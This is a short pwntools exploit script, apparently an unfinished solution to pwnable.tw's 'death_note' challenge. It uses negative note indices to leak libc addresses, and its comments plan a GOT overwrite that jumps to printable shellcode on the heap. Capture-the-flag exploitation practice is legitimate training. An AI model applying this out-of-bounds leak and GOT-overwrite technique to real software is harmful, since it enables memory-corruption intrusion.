from pwn import *

# obivious out ò bound bug can use to overwrite or leak
# remote and local environment are different, heap (local) doesnt hve rwx
# overwrite got -> heap -> printable shellcode

exe = ELF("./death_note")
context.binary = exe

p_s = lambda data: p.send(data)
p_sa = lambda msg, data: p.sendafter(msg, data)
p_sl = lambda data: p.sendline(data)
p_sla = lambda msg, data: p.sendlineafter(msg, data)
p_recvut = lambda msg: p.recvuntil(msg)
debug = lambda : gdb.attach(p, gdbscript = script)

def add_note(index, name):
    p_sa(b"Your choice :", b"1")
    p_sa(b"Index :", f"{index}".encode())
    p_sa(b"Name :", name)

def show_note(index):
    p_sa(b"Your choice :", b"2")
    p_sa(b"Index :", f"{index}".encode())

def del_note(index):
    p_sa(b"Your choice :", b"3")
    p_sa(b"Index :", f"{index}".encode())

'''
read_int in main
str_dup in add_note
is_printable in add_note
printf in show_note
'''

script = '''
b *0x80489CD
b *0x80487D3
b *0x80487C0
b *0x80488EB
'''

#p = remote("chall.pwnable.tw", 10201)
p = gdb.debug("./death_note", gdbscript = script)

# 0x20 <= ?? <= 0x7e
add_note(0, b"A" * 80)
show_note(-783) # leak __libc_start_main
show_note(-877) # leak stdout

p.interactive()